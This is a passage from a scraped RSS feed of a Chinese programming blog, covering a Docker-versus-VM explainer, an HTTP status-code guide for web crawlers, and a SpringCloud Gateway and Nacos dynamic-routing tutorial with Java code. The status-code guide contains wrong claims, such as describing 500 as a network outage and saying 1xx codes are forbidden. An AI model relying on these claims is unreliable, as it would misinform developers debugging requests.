容器镜像时，实际上你只是拉取了 CentOS 的用户态部分（包括系统工具、库、配置文件等），而不包含 CentOS 的内核。容器中的进程依然使用的是宿主机的内核来运行。因此，无论宿主机运行的是 Ubuntu 还是其他发行版的内核，只要它是 Linux 内核，容器中的 CentOS 文件系统都可以正常工作。Docker和VM对比但是事实上，宿主机不可能光有一个内核态，他也是有用户态的。当你在一个 Ubuntu 宿主机上运行一个 CentOS 容器时，容器中的进程会使用 CentOS 的用户态工具和库。比如，容器中的 yum（CentOS 的包管理器）可以正常运行，而不会使用 Ubuntu 的 apt（Ubuntu 的包管理器）。因此，容器就像是一个独立的系统，拥有自己的文件系统、程序、配置等，不依赖宿主机的用户态。你可以把它想象为容器本身有一个“虚拟的用户态”，但它并不运行在宿主机的用户态环境中。当你在一个 Ubuntu 宿主机上运行了一个 CentOS 虚拟机，虚拟机内的 CentOS 系统会像在物理机上一样启动，它将加载自己的 CentOS 内核，并启动 CentOS 的用户态环境。CentOS 虚拟机使用自己的内核来处理系统调用、管理进程、分配内存等。这个内核与宿主机的内核完全独立，因此 CentOS 虚拟机可以运行与宿主机不同版本的内核。对 Docker 项目来说，它最核心的原理实际上就是为待创建的用户进程：启用 Linux Namespace 配置；设置指定的 Cgroups 参数；切换进程的根目录（Change Root）。http://www.ppmy.cn/news/1540387.html相关文章请求的响应----状态码分为五大类(爬虫)前言 一个爬虫的成功与否&amp;#xff0c;在于你是否拿到了想要的数据&amp;#xff1b;一个请求的成功与否&amp;#xff0c;在于响应的状态码&amp;#xff0c;它标明了当前请求下这个响应的结果&amp;#xff0c;是好还是坏。上节课程学习了HTTPS和HTTP协议的各自优势&amp;#xff0c;本节课程进入到请求…阅读更多...SpringCloud Gateway 网关路由全自动实现方案动态网关路由 
实现动态路由需要将路由配置保存到Nacos&amp;#xff0c;然后在网关监听Nacos中的路由配置&amp;#xff0c;并实现配置热更新&amp;#xff0c;然而网关路由并不是自定义业务配置属性&amp;#xff0c;本身不具备热更新功能&amp;#xff01; 详情可以参考org.springframework.cloud.gat…阅读更多...今日总结10.18Exception 和Error 有什么区别 
Exception和Error都是Java等编程语言中异常处理机制的重要组成部分&amp;#xff0c;它们都继承自Throwable类。以下是两者的主要区别&amp;#xff1a; 
定义与性质 
Error&amp;#xff1a; 
1.表示严重的系统级错误&amp;#xff0c;如内存溢出&amp;#xff08;OutOfM…阅读更多...01_MVCC（多版本并发机制）MVCC&amp;#xff08;多版本并发机制&amp;#xff09; 文章目录 MVCC&amp;#xff08;多版本并发机制&amp;#xff09;简介工作原理主要组件 事务隔离级别与 MVCC实现方式快照读&amp;#xff08;Snapshot Read&amp;#xff09;当前读&amp;#xff08;Current Read&amp;#xff09;版本链管理 MVCC 的优缺点优点缺…阅读更多...利用 Llama 3.1模型 + Dify开源LLM应用开发平台，在你的Windows环境中搭建一套AI工作流文章目录 1. 什么是Ollama&amp;#xff1f;2. 什么是Dify&amp;#xff1f;3. 下载Ollama4. 安装Ollama5. Ollama Model library模型库6. 本地部署Llama 3.1模型7. 安装Docker Desktop8. 使用Docker-Compose部署Dify9. 注册Dify账号10. 集成本地部署的 Llama 3.1模型11. 集成智谱AI大模型…阅读更多...计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13 目录 文章目录 计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13目录1. The Cognitive Capabilities of Generative AI: A Comparative Analysis with Human Benchmarks2. WALL-E: World Alig…阅读更多...Open-WebUIOpen-WebUI特点⭐ 
️直观的界面&amp;#xff1a;聊天界面从 ChatGPT 中汲取灵感&amp;#xff0c;确保用户友好的体验。响应式设计&amp;#xff1a;在桌面和移动设备上享受无缝体验。⚡快速响应&amp;#xff1a;享受快速响应的性能。轻松设置&amp;#xff1a;使用 Docker 或 Kubernetes&amp;#xff08;…阅读更多...ToB项目身份认证AD集成（完）：利用ldap.js实现与windows AD对接实现用户搜索、认证、密码修改等功能 - 以及针对中文转义问题的补丁方法介绍在前面的两篇文章中，我详细的介绍了使用ldap与window AD服务集成，实现ToB项目中的身份认证集成方案，包括技术方案介绍、环境配置： ToB项目身份认证AD集成（一）：基于目录的用户管理、LDAP和Active Directory简述 ToB项目身份认证AD集成（二）：一分钟搞定window server 20…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径docker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:26 +0000</pubDate>
    </item>
    <item>
      <title>请求的响应----状态码分为五大类(爬虫)</title>
      <link>https://www.ppmy.cn/news/1540386.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维请求的响应----状态码分为五大类(爬虫)news/2025/10/31 17:53:25/前言一个爬虫的成功与否，在于你是否拿到了想要的数据；一个请求的成功与否，在于响应的状态码，它标明了当前请求下这个响应的结果，是好还是坏。上节课程学习了HTTPS和HTTP协议的各自优势，本节课程进入到请求的响应部分，学习下如何根据响应状态码，判断当前响应是好还是坏。状态码的重要意义互联网是个超级复杂的超大型项目，没网络的情况下，我们的电脑访问不了网络；有网络的前提下，网站正常工作我们才能访问。单个的请求响应流程是非常简单的，如下图：为了应对复杂多变的网络情况，http协议在设计之初就准备好了响应状态码，来标识本次请求响应的状态。HTTP状态码（英语：HTTP Status Code）是用以表示网页服务器超文本传输协议响应状态的3位数字代码。它由 RFC 2616 规范定义的，并在后续的HTTP新版本的规范中扩展。所有状态码的第一个数字代表了响应的五种状态之一。状态码分为五大类，分别是：100系列：消息【除非在某些试验条件下，服务器禁止向此类客户端发送 1xx 响应】200系列：成功300系列：跳转400系列：失败500系列：错误虽说是5类，但是100系列，是不允许使用的，所以常见的是4类。下面详细介绍一下这4类中，常见的状态码数值和所表达的意思。成功的200系列200是浏览器的日常使用中最常见的，因为网站要正常工作，200是必须的，不然工程师要挨骂的。200OK：这个是最常见的，也是爬虫工程师最喜欢的，代表你本次的请求顺利拿到了响应，没有任何问题。201 Created：201代表创建成功，通常是指浏览器或爬虫给服务器上传数据，服务器接收并验证数据没问题之后，服务器返回客户端一个201，代表成功。提交数据，通常是POST方法提交202Accepted：服务器拿到了数据，但是还没处理好结果，所以先发回一个202。这个状态码一般在爬虫中看不到，但是适合在异步操作的情况下返回。跳转的300系列通常为了更方便的操作，服务器会告诉客户端进一步的优化操作，例如张三搬家了，旧服务器给你新地址让你找新服务器等；301MovedPermanently：当前资源的网址永久性迁移，并且会给你一个新的网址。值得注意的是，如果是POST请求拿到301，则下一次请求自动变成GET。302MoveTemporarily：当前资源网址暂时性迁移到新地址，和301性质有点不一样。304NotModified：这个在浏览器加载静态资源的时候，特别容易碰到，就是浏览器使用本地缓存而不消耗带宽去加载在线的静态资源，是加速网页渲染的一种资源调用机制。是前端程序员嫌弃的一个状态码。失败的400系列400系列代表着失败，是爬虫程序中非常常见的，没有之一。而且很多时候，一个错误需要调试挺长时间的。了解400系列中常见的错误，对调试非常有益。400BadRequest：错误请求，400系列最典型的，看到这个错误，要么是请求头参数不对，要么是请求主体的内容错误。401Unauthorized：401认证错误，这个还是非常好识别的，身份无法识别或者身份权限不够，检查请求头中的身份字段信息和Cookie值。403Forbidden：禁止访问，大并发爬虫中比较容易碰到，问题很直观，你访问太多了【换IP或电脑】，或者身份权限不够【换身份信息】。404NotFound：404找不到，这个错误不用太在意，用浏览器测试几次就好，要么是你的网址写错了，要么是网址对应的网络资源无法加载【这不怪程序】。405MethodNotAllowed：405方法不被允许，简单且少见的错误，意思就是你请求的姿势不对，检查请求方法，如Get、Post、Put、Delete，总有一个是对的。错误的500系列500InternalServerError：网络错误，就和你断网了一样，具体点就是你的网络和网址所在网络，无法连通。502BadGateway：网关错误，请求出去要被网关解析目的地址并转发你的请求，这个错误就是网关不工作了，无法把你的请求发出去。这里的网关，可以理解成你的路由器或者你用的代理IP服务器。503 Service Unavailable：服务不可用，这个就是目标服务器的问题了，你要做的是通知网站管理员或者等。一般情况下，国家网站部分有休息时间，例如晚上关网。商业服务器的服务不可用，大多是升级或者临时卡了，可以过段时间再试。504GatewayTimeout：网关超时，这个504和502，都是网关的问题，但是又不一样。504是你找网关转发，你默认等待180秒【3分钟】，然后网关超时了没理你；502的问题是，你压根就找不到网关。505HTTPVersionNotSupported：HTTP版本不支持，这个比较少见，但是肯定有。网站内容太新或者太旧，对客户端的http版本要求不一样。你需要检查下本次请求所使用的http版本，然后改成网站指定版本，就可以解决这个问题。以上是常见的4类状态码的说明。最后说明下，状态码是对当前本次的请求响应做的一个说明代码，是一种规范。这个状态码数值，服务器那边可以规定返回的数值，服务端开发者可以完全照着规范来开发，也可以不遵循规范开发网站的响应状态码。例如你用爬虫登录错误的账号，登录请求发出去，服务器给你响应，可能结果如下：响应状态码是200，内容写的是账号密码不对；响应状态码是401，内容写的是账号密码不对；响应状态码是404，内容写的是账号密码不对；以上的返回结果都是有可能的，因为规范不是所有开发者都会遵守。但是300和500系列，大部分都是遵循规范的，因为这两个系列，大部分结果不是服务器给响应状态码，是客户端【浏览器或爬虫】直接根据网络请求，返回的结果。最后一个示例图，不同系列的状态码通常出现在的请求响应阶段：总结状态码是HTTP协议的规范，即便电脑断了网，失败的响应都会有一个状态码。了解了状态码，可以更理智的分析当前响应的状态，快速定位具体问题，以及修改爬虫代码。当然状态码这仅仅是规范中的一项，下节课程还要学习请求头中的重点字段，这也是非常重要的信息。一个爬虫的成功与否，在于你是否拿到了想要的数据；一个请求的成功与否，在于响应的状态码，它标明了当前请求下这个响应的结果，是好还是坏。上节课程学习了HTTPS和HTTP协议的各自优势，本节课程进入到请求的响应部分，学习下如何根据响应状态码，判断当前响应是好还是坏。http://www.ppmy.cn/news/1540386.html相关文章SpringCloud Gateway 网关路由全自动实现方案动态网关路由 
实现动态路由需要将路由配置保存到Nacos&amp;#xff0c;然后在网关监听Nacos中的路由配置&amp;#xff0c;并实现配置热更新&amp;#xff0c;然而网关路由并不是自定义业务配置属性&amp;#xff0c;本身不具备热更新功能&amp;#xff01; 详情可以参考org.springframework.cloud.gat…阅读更多...今日总结10.18Exception 和Error 有什么区别 
Exception和Error都是Java等编程语言中异常处理机制的重要组成部分&amp;#xff0c;它们都继承自Throwable类。以下是两者的主要区别&amp;#xff1a; 
定义与性质 
Error&amp;#xff1a; 
1.表示严重的系统级错误&amp;#xff0c;如内存溢出&amp;#xff08;OutOfM…阅读更多...01_MVCC（多版本并发机制）MVCC&amp;#xff08;多版本并发机制&amp;#xff09; 文章目录 MVCC&amp;#xff08;多版本并发机制&amp;#xff09;简介工作原理主要组件 事务隔离级别与 MVCC实现方式快照读&amp;#xff08;Snapshot Read&amp;#xff09;当前读&amp;#xff08;Current Read&amp;#xff09;版本链管理 MVCC 的优缺点优点缺…阅读更多...利用 Llama 3.1模型 + Dify开源LLM应用开发平台，在你的Windows环境中搭建一套AI工作流文章目录 1. 什么是Ollama&amp;#xff1f;2. 什么是Dify&amp;#xff1f;3. 下载Ollama4. 安装Ollama5. Ollama Model library模型库6. 本地部署Llama 3.1模型7. 安装Docker Desktop8. 使用Docker-Compose部署Dify9. 注册Dify账号10. 集成本地部署的 Llama 3.1模型11. 集成智谱AI大模型…阅读更多...计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13 目录 文章目录 计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13目录1. The Cognitive Capabilities of Generative AI: A Comparative Analysis with Human Benchmarks2. WALL-E: World Alig…阅读更多...Open-WebUIOpen-WebUI特点⭐ 
️直观的界面&amp;#xff1a;聊天界面从 ChatGPT 中汲取灵感&amp;#xff0c;确保用户友好的体验。响应式设计&amp;#xff1a;在桌面和移动设备上享受无缝体验。⚡快速响应&amp;#xff1a;享受快速响应的性能。轻松设置&amp;#xff1a;使用 Docker 或 Kubernetes&amp;#xff08;…阅读更多...ToB项目身份认证AD集成（完）：利用ldap.js实现与windows AD对接实现用户搜索、认证、密码修改等功能 - 以及针对中文转义问题的补丁方法介绍在前面的两篇文章中，我详细的介绍了使用ldap与window AD服务集成，实现ToB项目中的身份认证集成方案，包括技术方案介绍、环境配置： ToB项目身份认证AD集成（一）：基于目录的用户管理、LDAP和Active Directory简述 ToB项目身份认证AD集成（二）：一分钟搞定window server 20…阅读更多...理解C#中空值条件运算符及空值检查简化前言 .NET 4.6 及以上版本，提供了空值条件运算符 ?. 和 ?[]。这些运算符的引入，为我们提供了一种简明的方式来处理空值的场景、简化空值检查，可避免 NullReferenceExceptions 的异常。本文将探索 C# 的空值检查运算符。 
介绍 空值，这里指的是 null。在定义对象后，未对其…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径docker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:25 +0000</pubDate>
    </item>
    <item>
      <title>SpringCloud Gateway 网关路由全自动实现方案</title>
      <link>https://www.ppmy.cn/news/1540385.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维SpringCloud Gateway 网关路由全自动实现方案news/2025/10/31 17:53:24/动态网关路由实现动态路由需要将路由配置保存到Nacos，然后在网关监听Nacos中的路由配置，并实现配置热更新，然而网关路由并不是自定义业务配置属性，本身不具备热更新功能！详情可以参考org.springframework.cloud.gateway.route包下的CompositeRouteDefinitionLocator类如果希望 Nacos 推送配置变更，可以使用 Nacos 动态监听配置接口来实现。这个详情也可以参考 Nacos JDK文档 监听配置部分可以帮助到您通过Nacos的JDK文档，了解到Nacos支持 获取配置、发布配置、监听配置，那么我们可以根据以上JDK接口设计出以下的一种全自动方案。网关启动后监听Nacos注册中心上的路由配置，而业务启动后，从Nacos注册中心拉取已有的路由配置信息，首先判断自身的路由是否存在，若存在则删除后将自身最新的路由信息添加上去，最后路由配置信息发布到Nacos上，网关监听到变化后将重新写入路由信息到内存当中。自动发布路由实现这种很多服务都需要用到的配置我们可以将其抽取成一个通用的Nacos自动路由注册发布配置类，注册成容器交给Spring管理所需依赖&lt;dependencies&gt;&lt;!--SpringCloudAlibabaNacos服务注册发现依赖--&gt;&lt;dependency&gt;&lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--SpringCloudAlibabaNacosConfig配置管理起步依赖--&gt;&lt;dependency&gt;&lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt;&lt;/dependencies&gt;属性类这里只是做了网关路由常见的断言和过滤器的适配支持，如果有别的特殊要求还得执行进行一个添加配置packagecom.if010.common.nacos.properties;importlombok.Data;importlombok.NoArgsConstructor;importlombok.ToString;importorg.springframework.boot.context.properties.ConfigurationProperties;importorg.springframework.context.annotation.Configuration;importorg.springframework.stereotype.Component;importjava.io.Serializable;importjava.util.ArrayList;importjava.util.HashMap;importjava.util.Map;/*** Nacos自动发布路由配置信息* @author Kim同学*/@Data@ConfigurationProperties(prefix="autopublishroute")publicclassNacosAutoPublishProperties{/*** 是否推送自身的路由信息*/publicbooleanenabled;/*** Nacos 网关路由配置命名空间*/publicStringdataId;/*** Nacos 网关路由配置分组*/publicStringgroup;/*** Nacos 网关路由配置超时时间*/publiclongtimeoutMs=60000;/*** 路由配置信息*/publicRouteInforouteinfo;@Data@ConfigurationProperties(prefix="autopublishroute.routeinfo")publicclassRouteInfo{/*** 路由ID*/publicStringid;/*** 路由URI*/publicStringuri;/*** 路由断言predicates信息*/publicArrayList&lt;HashMap&lt;String,String&gt;&gt;predicates;/*** 路由过滤器filters信息*/publicArrayList&lt;HashMap&lt;String,String&gt;&gt;filters;}}实体类这里的实体类主要用于从Nacos注册中心拉取回来的数据进行一个Json格式转对象，方便代码的书写和可读性的提高，当然也可以根据业务或者设计、习惯等进行一个调整packagecom.if010.common.nacos.entity;importlombok.AllArgsConstructor;importlombok.Data;importlombok.NoArgsConstructor;importjava.util.List;importjava.util.Map;/*** Nacos 网关路由信息实体类* @author Kim同学*/@Data@AllArgsConstructor@NoArgsConstructorpublicclassNacosRoute{/*** 路由ID*/publicStringid;/*** 路由URI*/publicStringuri;/*** 路由断言predicates信息*/publicList&lt;RouteAssert&gt;predicates;/*** 路由过滤器filters信息*/publicList&lt;RouteAssert&gt;filters;@Data@AllArgsConstructor@NoArgsConstructorpublicclassRouteAssert{/*** 断言名称*/publicStringname;/*** 断言参数*/publicMap&lt;String,String&gt;args;}}配置类packagecom.if010.common.nacos.config;importcom.alibaba.cloud.nacos.NacosConfigManager;importcom.alibaba.fastjson.JSON;importcom.alibaba.nacos.api.exception.NacosException;importcom.if010.common.nacos.entity.NacosRoute;importcom.if010.common.nacos.properties.NacosAutoPublishProperties;importlombok.RequiredArgsConstructor;importlombok.extern.slf4j.Slf4j;importorg.springframework.boot.autoconfigure.condition.ConditionalOnProperty;importorg.springframework.boot.context.properties.EnableConfigurationProperties;importorg.springframework.stereotype.Component;importjavax.annotation.PostConstruct;importjava.util.*;/*** Nacos自动发布路由配置类* 判断是否注册该类到Bean容器当中，当配置文件中autopublishroute.enabled = true时生效, 否则不生效* @Author: Kim同学*/@Slf4j@Component@RequiredArgsConstructor@EnableConfigurationProperties({NacosAutoPublishProperties.class,NacosAutoPublishProperties.RouteInfo.class})@ConditionalOnProperty(name="autopublishroute.enabled",havingValue="true")publicclassNacosAutoPublishConfig{// 注入 NacosConfigManagerprivatefinalNacosConfigManagernacosConfigManager;// 注入 NacosConfigPropertiesprivatefinalNacosAutoPublishPropertiesnacosAutoPublishProperties;// 注入 AppInfoRouteprivatefinalNacosAutoPublishProperties.RouteInforouteInfo;/*** 在Bean创建，且NacosConfigManager注入成功后，发布路由配置*/@PostConstructpublicvoidinitPublish()throwsNacosException{// 1、获取网关路由配置信息StringrouteConfig=nacosConfigManager.getConfigService().getConfig(// Nacos 网关路由配置命名空间nacosAutoPublishProperties.getDataId(),// Nacos 网关路由配置分组nacosAutoPublishProperties.getGroup(),// Nacos 网关路由配置超时时间nacosAutoPublishProperties.getTimeoutMs());// 2、将Nacos中获取到的网关路由配置信息转换为数组对象List&lt;NacosRoute&gt;nacosRoutes=JSON.parseArray(routeConfig,NacosRoute.class);log.info("【Nacos自动发布路由配置】获取网关路由配置信息: {}",nacosRoutes);// 2-1、获取路由断言predicates信息ArrayList&lt;HashMap&lt;String,String&gt;&gt;predicates=routeInfo.getPredicates();log.info("【Nacos自动发布路由配置】获取配置文件中的断言 predicates 信息: {}",predicates);// 2-2、获取路由断言filters信息ArrayList&lt;HashMap&lt;String,String&gt;&gt;filters=routeInfo.getFilters();log.info("【Nacos自动发布路由配置】获取配置文件中的断言 filters 信息: {}",filters);// 3、组装路由信息NacosRoutenacosRoute=newNacosRoute(// 路由IDrouteInfo.getId(),// 路由URIrouteInfo.getUri(),// 路由断言predicates信息argsAssemble(predicates),// 路由过滤filters信息argsAssemble(filters));// 4、检查Nacos中是否有该路由,并删除for(inti=0;i&lt;nacosRoutes.size();i++){if(nacosRoutes.get(i).getId().equals(nacosRoute.getId())){nacosRoutes.remove(i);}}// 5、网关路由配置信息数组对象中nacosRoutes.add(nacosRoute);// 6、将网关路由配置信息数组发布到Nacos中nacosConfigManager.getConfigService().publishConfig(// Nacos 网关路由配置命名空间nacosAutoPublishProperties.getDataId(),// Nacos 网关路由配置分组nacosAutoPublishProperties.getGroup(),// 自身路由配置信息JSON.toJSONString(nacosRoutes),// Nacos 网关路由配置格式，根据动态路由获取规则定义"json");log.info("【Nacos自动发布路由配置】发布网关路由配置信息: {}",nacosRoutes);}/*** 组装路由配置信息的方法*/privateArrayList&lt;NacosRoute.RouteAssert&gt;argsAssemble(ArrayList&lt;HashMap&lt;String,String&gt;&gt;args){// 判断是否存在配置if(args==null||args.size()==0){returnnull;}// 定义args集合ArrayList&lt;NacosRoute.RouteAssert&gt;argsList=newArrayList&lt;&gt;();args.forEach(arg-&gt;{NacosRoutenacosRoute=newNacosRoute();// 键名和值StringkeyName=arg.keySet().iterator().next();Stringvalue=arg.get(keyName);// 将配置值以逗号分隔转数组，["/system-service/**","/api/sys/**"]List&lt;String&gt;genkeyList=Arrays.asList(value.split(","));// 循环组装断言信息，{"_genkey_0": "args.value"}Map&lt;String,String&gt;argsMap=newHashMap&lt;&gt;();for(inti=0;i&lt;genkeyList.size();i++){argsMap.put("_genkey_"+i,genkeyList.get(i));}// 将断言信息转换为对象放入集合当中，[{"name": "keyName", "args": {"_genkey_0": "args.value", "_genkey_1": "args.value"}}]argsList.add(nacosRoute.newRouteAssert(keyName,argsMap));});returnargsList;}}这里需要注意的是，因为是starter模块，可能他人的项目目录和starter模块的目录不一致，导致加载不到NacosAutoPublishConfig类，我们需要使用spring.factories把NacosAutoPublishConfig类装载到Spring容器，在resources/META-INF/spring添加org.springframework.boot.autoconfigure.AutoConfiguration.imports文件测试到此，我们已经将Nacos通用配置管理抽取完成，接下来我们仅需要在业务服务模块中引入我们抽取好的依赖即可，当然引入依赖后我们还需要进行一下application.yml文件的属性定义配置# Springspring:application:# 应用名称name:if010-testprofiles:# 环境配置active:devcloud:nacos:discovery:# 服务注册地址server-addr:127.0.0.1:8848config:# 配置中心地址server-addr:127.0.0.1:8848# 配置文件格式file-extension:yml# 共享配置shared-configs:-application-${spring.profiles.active}.${spring.cloud.nacos.config.file-extension}-application-${spring.profiles.active}-nacos.${spring.cloud.nacos.config.file-extension}-${spring.application.name}-${spring.profiles.active}.${spring.cloud.nacos.config.file-extension}# 超时时间timeout:3000# 自动推送自己的路由注册信息autopublishroute:# 是否推送自身的路由信息enabled:true# Nacos 网关路由配置命名空间dataId:if010-gateway-routes.josn# Nacos 网关路由配置分组group:DEFAULT_GROUP# Nacos 网关路由配置超时时间timeoutMs:60000routeinfo:id:test-serviceuri:lb://if010-testpredicates:-Path:/test-service/**filters:-StripPrefix:1启动的过程中我们可以过滤一下日志看看拉取回来的配置和重新发布的配置信息15:10:15.735 [main] INFO  c.i.c.n.c.NacosAutoPublishConfig - [initPublish,57] - 【Nacos自动发布路由配置】获取网关路由配置信息: [NacosRoute(id=system-service, uri=lb://if010-system, predicates=[NacosRoute.RouteAssert(name=Path, args={_genkey_0=/system-service/**})], filters=[NacosRoute.RouteAssert(name=StripPrefix, args={_genkey_0=1})]), NacosRoute(id=test-service, uri=lb://if010-test, predicates=[NacosRoute.RouteAssert(name=Path, args={_genkey_0=/test-service/**, _genkey_1=/test/**})], filters=[NacosRoute.RouteAssert(name=StripPrefix, args={_genkey_0=1})])]
15:10:15.738 [main] INFO  c.i.c.n.c.NacosAutoPublishConfig - [initPublish,61] - 【Nacos自动发布路由配置】获取配置文件中的断言 predicates 信息: [{Path=/test-service/**}]
15:10:15.739 [main] INFO  c.i.c.n.c.NacosAutoPublishConfig - [initPublish,65] - 【Nacos自动发布路由配置】获取配置文件中的断言 filters 信息: null
15:10:15.779 [main] INFO  c.i.c.n.c.NacosAutoPublishConfig - [initPublish,100] - 【Nacos自动发布路由配置】发布网关路由配置信息: [NacosRoute(id=system-service, uri=lb://if010-system, predicates=[NacosRoute.RouteAssert(name=Path, args={_genkey_0=/system-service/**})], filters=[NacosRoute.RouteAssert(name=StripPrefix, args={_genkey_0=1})]), NacosRoute(id=test-service, uri=lb://if010-test, predicates=[NacosRoute.RouteAssert(name=Path, args={_genkey_0=/test-service/**})], filters=null)]最后从Nacos注册中心上查看配置是否成功发布网关动态路由实现所需依赖&lt;dependencies&gt;&lt;!--SpringCloudGateway网关服务起步依赖--&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--SpringCloudAlibabaNacos服务注册发现依赖--&gt;&lt;dependency&gt;&lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--SpringCloudAlibabaNacosConfig配置管理起步依赖--&gt;&lt;dependency&gt;&lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--SpringCloudLoadbalancer负载均衡依赖模块--&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-loadbalancer&lt;/artifactId&gt;&lt;/dependency&gt;&lt;/dependencies&gt;属性类这个属性定义也不是必须得，只是方便可以更加灵活进行一个变更，所以才进行这样的一个属性定义类，可以根据系统业务的设计来进行定义packagecom.if010.gateway.properties;importlombok.Data;importlombok.NoArgsConstructor;importlombok.ToString;importorg.springframework.boot.context.properties.ConfigurationProperties;importorg.springframework.stereotype.Component;/*** Swagger Properties配置信息实体类* @author Kim同学*/@Data@NoArgsConstructor@ToString@Component@ConfigurationProperties(prefix="spring.cloud.gateway.discovery.locator")publicclassRouteAutoLoaderProperties{/*** 是否启用自动加载路由配置*/publicbooleanenabled;/*** Nacos 网关路由配置命名空间*/publicStringdataId;/*** Nacos 网关路由配置分组*/publicStringgroup;/*** Nacos 网关路由配置拉取超时时间*/publicIntegertimeoutMs=60000;}配置类packagecom.if010.gateway.config;importcom.alibaba.cloud.nacos.NacosConfigManager;importcom.alibaba.fastjson.JSONArray;importcom.alibaba.nacos.api.config.listener.Listener;importcom.alibaba.nacos.api.exception.NacosException;importcom.if010.gateway.properties.RouteAutoLoaderProperties;importlombok.RequiredArgsConstructor;importlombok.extern.slf4j.Slf4j;importorg.springframework.boot.autoconfigure.condition.ConditionalOnProperty;importorg.springframework.cloud.gateway.route.RouteDefinition;importorg.springframework.cloud.gateway.route.RouteDefinitionWriter;importorg.springframework.stereotype.Component;importreactor.core.publisher.Mono;importjavax.annotation.PostConstruct;importjava.util.HashSet;importjava.util.List;importjava.util.Set;importjava.util.concurrent.Executor;importjava.util.concurrent.Executors;/*** 网关路由自动加载配置类* 判断是否注册该类到Bean容器当中，当配置文件中spring.cloud.gateway.discovery.locator.enabled = true时生效, 否则不生效* @author Kim同学*/@Slf4j@Component@RequiredArgsConstructor@ConditionalOnProperty(name="spring.cloud.gateway.discovery.locator.enabled",havingValue="true")publicclassRouteAutoLoaderConfig{// 注入 NacosConfigManagerprivatefinalNacosConfigManagernacosConfigManager;// 注入 RouteAutoLoaderPropertiesprivatefinalRouteAutoLoaderPropertiesrouteAutoLoaderProperties;// 注入 RouteDefinitionWriterprivatefinalRouteDefinitionWriterwriter;// 定义路由ID集合privateSet&lt;String&gt;routeIds=newHashSet&lt;&gt;();/*** 在Bean创建，且NacosConfigManager注入成功后，初始化路由配置*/@PostConstructpublicvoidinitRouteConfiguration()throwsNacosException{log.info("【网关路由自动加载】开始初始化路由配置 {} {} {}",routeAutoLoaderProperties.getDataId(),routeAutoLoaderProperties.getGroup(),routeAutoLoaderProperties.getTimeoutMs());// 1、第一次启动时，拉取路由表，并且添加监听器StringconfigAndSignListener=nacosConfigManager.getConfigService().getConfigAndSignListener(// 设定 Nacos 网关路由配置命名空间routeAutoLoaderProperties.getDataId(),// 设定 Nacos 网关路由配置分组routeAutoLoaderProperties.getGroup(),// 设定 Nacos 网关路由配置拉取超时时间routeAutoLoaderProperties.getTimeoutMs(),newListener(){@OverridepublicExecutorgetExecutor(){// 